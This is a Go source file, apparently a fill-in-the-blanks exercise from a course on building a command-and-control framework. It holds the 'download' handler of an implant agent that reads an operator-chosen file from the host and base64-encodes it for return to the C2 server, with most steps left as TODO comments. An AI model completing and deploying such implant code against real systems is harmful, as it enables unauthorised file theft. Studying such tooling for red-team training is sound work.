package agent

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"

	"c2framework/internals/control"
	"c2framework/internals/models"
	"c2framework/internals/server"
)

// orchestrateDownload is the orchestrator for the "download" command
func (agent *HTTPSAgent) orchestrateDownload(job *server.HTTPSResponse) AgentTaskResult {

	// Unmarshal the arguments
	// TODO: create downloadArgs of type control.DownloadArgs
	// TODO: Unmarshall and send back error if failed

	log.Printf("|DOWNLOAD ORCHESTRATOR| Task ID: %s. Downloading file: %s",
		job.JobID, downloadArgs.FilePath)

	// Agent-side validation
	// TODO: ensure FilePath is not empty
	// TODO: if it is - send back error

	// Call the doer
	// TODO: call the doer doDownload(), downloadArgs.FilePath as arg, return value called result

	// Build the final result
	finalResult := AgentTaskResult{
		JobID: job.JobID,
	}

	outputJSON, _ := json.Marshal(result)
	finalResult.CommandResult = outputJSON

	if !result.Success {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Download failed for TaskID %s: %s",
			job.JobID, result.ErrorMsg)
		finalResult.Error = result.ErrorMsg
		finalResult.Success = false
	} else {
		log.Printf("|DOWNLOAD SUCCESS| Downloaded %d bytes from %s for TaskID %s",
			result.FileSize, downloadArgs.FilePath, job.JobID)
		finalResult.Success = true
	}

	return finalResult
}

// doDownload performs the actual file reading
func doDownload(filePath string) models.DownloadResult {
	result := models.DownloadResult{
		FilePath: filePath,
	}

	// NOTE - we use os library, handles cross-platform HENCE NO NEED FOR INTERFACE!
	// Check if file exists
	// TODO: call os.Stat with filePath as arg, return value as fileInfo
	// TODO: return error if not

	// Check if it's a regular file (not directory)
	// TODO: Call IsDir() on fileInfo, return error if it is

	// Capture fileSize (for validation back on server side)
	// TODO: use fileInfo.Size() to save file size to result

	// Read the file
	// TODO: call os.Open() to open the file, return as file
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to open file: %v", err)
		return result
	}
	// TODO: Close deferring file

	// TODO: call io.ReadAll() to load the actual file bytes into memory
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to read file: %v", err)
		return result
	}

	// Encode to base64 for safe JSON transmission
	// TODO: Call base64.StdEncoding.EncodeToString() to encode fileBytes into b64
	// TODO: Set result.Success to true

	log.Printf("|DOWNLOAD DOER| Read %d bytes from %s", len(fileBytes), filePath)
	return result
}
